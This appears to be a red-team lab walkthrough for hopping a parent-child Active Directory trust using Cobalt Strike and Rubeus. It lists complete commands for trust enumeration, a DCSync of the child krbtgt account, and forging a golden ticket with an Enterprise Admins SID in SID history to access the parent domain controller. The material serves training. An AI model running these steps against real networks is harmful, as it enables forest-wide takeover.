# Parent Child Trusts Lab  

>The objective for this lab is to hop from a child domain to its parent.

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Interact with the Beacon and enumerate the trust.

    ```Beacon-nocolor
    ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
    ```

⚠️ results
 
    > - trustDirection 3 is TRUST_DIRECTION_BIDIRECTIONAL
    > - trustAttributes 32 is TRUST_ATTRIBUTE_WITHIN_FOREST

3. Obtain the domain SID for the child domain.

	```Beacon-nocolor
    ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
    ```

⚠️ This should return *S-1-5-21-690277740-3036021016-2883941857*.

4. Obtain the SID for parent domain's Enterprise Admins group.

	```Beacon-nocolor
    ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
    ```
	
⚠️ This should return *S-1-5-21-3926355307-1661546229-813047887-519*.

===

## Credential Access

1. Impersonate the *sguest* user.

⚠️ This user is a domain admin in the child Dublin domain.

2. Obtain the AES256 hash for the child domain's krbtgt account.
  1.  `dcsync dublin.contoso.com DUBLIN\krbtgt `

===

## Exploitation

1. On the Attacker Desktop, forge a golden ticket and output to a kirbi file.

    ```Terminal-nocolor
    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
    ```

2. Inject the ticket into the Beacon session.

    ```Beacon-nocolor
    kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN TICKET].kirbi
    ```

⚠️ This will replace the current TGT for `sguest`.

3. Verify the ticket is in the session.
    1.  `run klist ` 

4. Access the parent domain's domain controller.
  1.   `ls \\\\lon-dc-1\\c$ `
  

⚠️ In this lab, you have forged a golden ticket using SID history to impersonate an enterprise admin, and hop a parent-child trust.

